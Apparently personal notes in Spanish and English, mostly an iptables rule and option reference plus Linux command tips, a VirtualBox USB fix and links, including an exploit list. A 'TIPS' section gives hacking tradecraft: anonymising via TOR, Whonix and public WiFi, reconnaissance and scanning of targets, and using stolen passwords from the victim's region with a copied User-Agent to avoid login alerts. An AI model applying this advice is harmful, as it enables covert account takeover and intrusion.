--state              "define una lista de distinto estados de las conexiones (INVALID, ESTABLISHED, NEW, RELATED)"
--to-source          "define que IP reportar al trafico externo"
-s                   "define trafico de origen"
-d                   "define trafico de destino"
--source-port        "define el puerto desde el que se origina la conexion"
--destinatio-port    "define el puerto hacia el que se dirige la conexion"
-t                   "tabla a utilizar, pueder ser nat, filter, mangle o raw"

Ejemplos de Reglas:

#iptables -A FORWARD -i eth0 -o eth0 -j ACCEPT
"Reenvío desde una interfaz de red local (eth1) hacia una interfaz de red publica (eth0)

#iptables -A FORWARD -i eth0 -o eth1 -m state --state ESTABLISHED,RELATED -j ACCEPT
"Aceptar reenviar los paquetes que son parte de conexiones existentes (ESTABLISHED) o relacionadas de tráfico entrante desde la interfaz eth1 para tráfico saliente por la interfaz eth0:"

#iptables -A INPUT -i eth0 -m state --state ESTABLISHED,RELATED -j ACCEPT
"Permitir paquetes en el pro	pio muro cortafuegos para tráfico saliente a través de la interfaz eth0 que son parte de conexiones existentes o relacionadas:"

#iptables -A INPUT -i eth1 -s 0/0 -d 0/0 -j ACCEPT
#iptables -A INPUT -i lo -s 0/0 -d 0/0 -j ACCEPT
"Permitir (ACCEPT) todo el tráfico entrante (INPUT) desde (-s) cualquier dirección (0/0) la red local (eth1) y desde el retorno del sistema (lo) hacia (-d) cualquier destino (0/0):"

#iptables -A POSTROUTING -t nat -s 192.168.0.0/24 -o eth0 -j SNAT --to-source x.y.z.c
"Hacer (-j) SNAT para el tráfico saliente (-o) a tráves de la interfaz eth0 proveniente desde (-s) la red local (192.168.0.0/24) utilizando (--to-source) la dirección IP w.x.y.z."

#iptables -A INPUT -i eth0 -s w.x.y.x/32 -j DROP
#iptables -A INPUT -i eth0 -s 192.168.0.0/24 -j DROP
#iptables -A INPUT -i eth0 -s 127.0.0.0/8 -j DROP
"Descartar (DROP) todo el tráfico entrante (-i) desde la interfaz eth0 que trate de utilizar la dirección IP pública del servidor (w.x.y.z), alguna dirección IP de la red local (192.168.0.0/24) o la dirección IP del retorno del sistema (127.0.01)"

#iptables -A INPUT -p tcp -s 0/0 -d 0/0 --destination-port 25 --syn -j ACCEPT
#iptables -A INPUT -p tcp -s 0/0 -d 0/0 --destination-port 80 --syn -j ACCEPT
#iptables -A INPUT -p tcp -s 0/0 -d 0/0 --destination-port 443 --syn -j ACCEPT
#iptables -A INPUT -p tcp -s 0/0 -d 0/0 --destination-port 22 --syn -j ACCEPT
"Aceptar (ACCEPT) todos los paquetes SYN (--syn) del protocolo TCP (-p tcp) para los puertos (--destination-port) de los protocolos SMTP (25), HTTP(80), HTTPS (443) y SSH (22):"

#iptables -A INPUT -p tcp -s 0/0 -d w.x.y.z/32 --destination-port 25 --syn -j ACCEPT
"Aceptar (ACCEPT) todos los paquetes SYN (--syn) del protocolo TCP (-tcp) para los puertos (--destination-port) del protocolos SMTP (25) en el servidor (w.x.y.z/32), desde (-s) cualquier lugar (0/0) hacia (-d) cualquier lugar (0/0)."

#iptables -A INPUT -p tcp -s 0/0 -d 0/0 --destination-port 110 --syn -j ACCEPT
#iptables -A INPUT -p tcp -s 0/0 -d 0/0 --destination-port 995 --syn -j ACCEPT
#iptables -A INPUT -p tcp -s 0/0 -d 0/0 --destination-port 143 --syn -j ACCEPT
#iptables -A INPUT -p tcp -s 0/0 -d 0/0 --destination-port 993 --syn -j ACCEPT
"Aceptar (ACCEPT) todos los paquetes SYN (--syn) del protocolo TCP (-p tcp) para los puertos (--destination-port) de los protocolos POP3 (110), POP3S (995), IMAP (143) y IMAPS (993):"

#iptables -A INPUT -i eth1 -p tcp --sport 68 --dport 67 -j ACCEPT
#iptables -A INPUT -i eth1 -p udp --sport 68 --dport 67 -j ACCEPT
"Aceptar (ACCEPT) el tráfico entrante (-i) proveniente desde la interfaz eth1 cuando las conexiones se establezcan desde el puerto  (--sport) 67 por protocolos (-p) TCP y UDP."

#iptables -A INPUT -p udp -s 200.33.146.217/32 --source-port 53 -d 0/0 -j ACCEPT
"Aceptar (ACCEPT) conexiones de tráfico entrante (INPUT) por protocolo (-p) UDP cuando se establezcan desde (-s) el servidor DNS 200.33.145.217 desde el puerto (--source-port) 53 hacia (-d) cualquier destino (0/0):"

#iptables -A INPUT -p tcp --destination-port 22 -j DROP
#iptables -A INPUT -p tcp --destination-port 23 -j DROP
"Descartar (DROP) el tráfico entrante (INPUT) para el protocolo (-p) TCP hacia los puerto (--destination-port) de SSH (22) y Telnet (23):"

#iptables -A INPUT -s a.b.c.d -j DROP
"Descartar (DROP) todo tipo de conexiones de tráfico entrante (INPUT) desde (-s) la dirección IP a.b.c.d:"

#iptables -A OUTPUT -d a.b.c.d -s 192.168.0.0/24 -j REJECT
"Rechazar (REJECT) conexiones hacia (OUTPUT) la dirección IP a.b.c.d desde la red local:"


#iptables -L
#iptables -S TCP
#iptables -L INPUT
#iptables -L INPUT -v
#iptables -Z                    "resetea el conteo de paquetes"
#iptables -L --line-numbers
#iptables -D                    "numero de regla" + "chain" Ex. iptables -D 3 INPUT
#iptables -F "chain"            "flush a single chain"
#iptables -F                    "flush all chains"


                      FLUSH ALL RULES, DELETE ALL CHAINS AND ACCEPT ALL

"/////////Note: This will effectively disable your firewall. You should only follow this section if you want to start over the configuration of your firewall.////////////////////////"

"First, set the default policies for each of the built-in chains to ACCEPT. The main reason to do this is to ensure that you won't be locked out from your server via SSH:"

#iptables -P INPUT ACCEPT
#Iptables -P FORWARD ACCEPT
#iptables -P OUTPUT ACCEPT

"Then flush the nat and mangle tables, flush all chains (-F), and delete all non-default chains (-X):"

#iptables -t nat -F
#iptables -t mangle -F
#iptables -F 
#iptables -X

"Your firewall will now allow all network traffic. If you list your rules now, you will will see there are none, and only the three default chains (INPUT, FORWARD, and OUTPUT) remain."


nmap error: offending packet
#iptables -A OUTPUT -m state --state NEW,ESTABLISHED,RELATED,INVALID -j ACCEPT
#iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT


«««««««««««««««««««««««««««««««««««««««««««««««««««««««««««»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»
 _____ ___________  _____ 
|_   _|_   _| ___ \/  ___|
  | |   | | | |_/ /\ `--. 
  | |   | | |  __/  `--. \
  | |  _| |_| |    /\__/ /
  \_/  \___/\_|    \____/ 
                          
                          TIPS:
			  
-1) Stay SAFE - Volúmenes encriptados+Whonix+TOR+an Anonymous WIFI ;)(thanks to the Estacion de Servicio+Biblioteca)
-2) Mapping out the Target: fierce+Whois lookups on IP&Domain names+Reverse Whois lookups to find all IP addresses and domain names....repeatedly sobre todas las IP's y dominios con los que nos vayamos encontrando, google search's y todo lo que se nos ocurra para sacar una foto con paisaje de nuestro objetiscpvo, lo que sobra en la red es ¿....?, es ¿...?, es INFORMACION: Twitter-Fcbook-LKDIN-bla,bla,bla
-3) Scanning&Exploiting: NMAP over todas las IP's(Services-MalasConfiguraciones-Software viejo)+Run NIKTO/WhatWeb/(Especific --> wpscan/CMS-explorer/Joomscan....)+

-Cuando usemos el password de alguien para entrar a distintos servicios o aplicaciones, en lo posible deberíamos usar
una IP de la misma ciudad o al menos del mismo  pais. y copiar su User-Agent para que el usuario no reciba un email 
sobre una nueva entrada a sus cuentas desde un nuevo dispositivo y desde un nuevo origen. (TKS Phineas Fisher, From
Catalan Police Union Hack video  ;) ;) ;) ;)    

-Cuando nos encontramos con un archivo en linux que empieza con el carácter "-" 
The usual way of doing this is to prefix the filename with a path - ./-, or /home/Tim/-. This technique is also used to get around similar issues where command line options clash with filenames, so a file referred to as ./-e does not appear as the -e command line option to a program, for example.

-Listar hidden files en un directorio: 
#ls -a|less

-Find humman-readable files on linux systems: 
#find /dir/to/search -type f -exec sh -c 'file -b {} | grep text &>/dev/null' \; -print

-Listar recursivamente en un servidor ordenando por dueño y grupo, ademas podemos 'grep':
#ls -l -R | sort -k 3 - sorts by owner and by default sorts the next field (group) and on
#ls -l -R | sort -k 4,4 -k 3 |grep usuarioSeñorX - sorts by group and then by owner
#ls -l -R | sort -k 3,3 -k 8 - sorts by owner and then by filename


-Buscar the only line of text data.txt that occurs only once:  
#< file.txt sort | uniq -u       # only print unique lines 
#< file.txt sort | uniq -d       # only print duplicate lines

-Print solo readable-hummans lines on data.txt matching with the specific character "=" (signo igual): 
#strings data.txt | grep =

-Decodear una archivo ROT13: 
#cat data.txt | tr a-zA-Z n-za-mN-ZA-M
#alias rot13="tr '[A-Za-z]' '[N-ZA-Mn-za-m]'"      → Con esto ya podemos usar 'rot13' como comando
#rot13 < InputFile > OutputFile_Roteado





_______________________________________________________________________________________________________

USB Vbox problems:

1) First of all open regedit and navigate to HKEY_LOCAL_MACHINE > SYSTEM > CurrentControlSet > Control > Class > {36­FC9E60-C465-11CF-8056-44455354­0000}

After you need to delete UpperFilters reg key from the right side.
2) Reboot your computer.
3) Now connect the USB device to your computer and open VirtualBox.
4) From the list select the virtual machine and from top open Settings and go to "USB" menu.
5) Now at right side press on "USB plus" green button and select USB device. Press on OK button and start the virtual machine.
6) Now disconnect USB device. Turn off the virtual machine and completely close VirtualBox.
7) Now connect the USB device and start virtual machine again.
If you are doing right then, USB device should work on your virtual machine.

________________________________________________________________________________________________________________________



referencias:

-_-     mega.z

https://github.com/enddo/awesome-windows-exploitation        //LISTA DE EXPLOITATIONS FOR...FOR....YES !!! FOR WINDOWS
mega:#F!WZpkGaqC!GUWUUDUaYFkCXYxEChPurA!CZA3zZ7Z             //LISTA DE MANUALES SOBRE INFORMATICA

_______________________________________________________________________________________________________________________
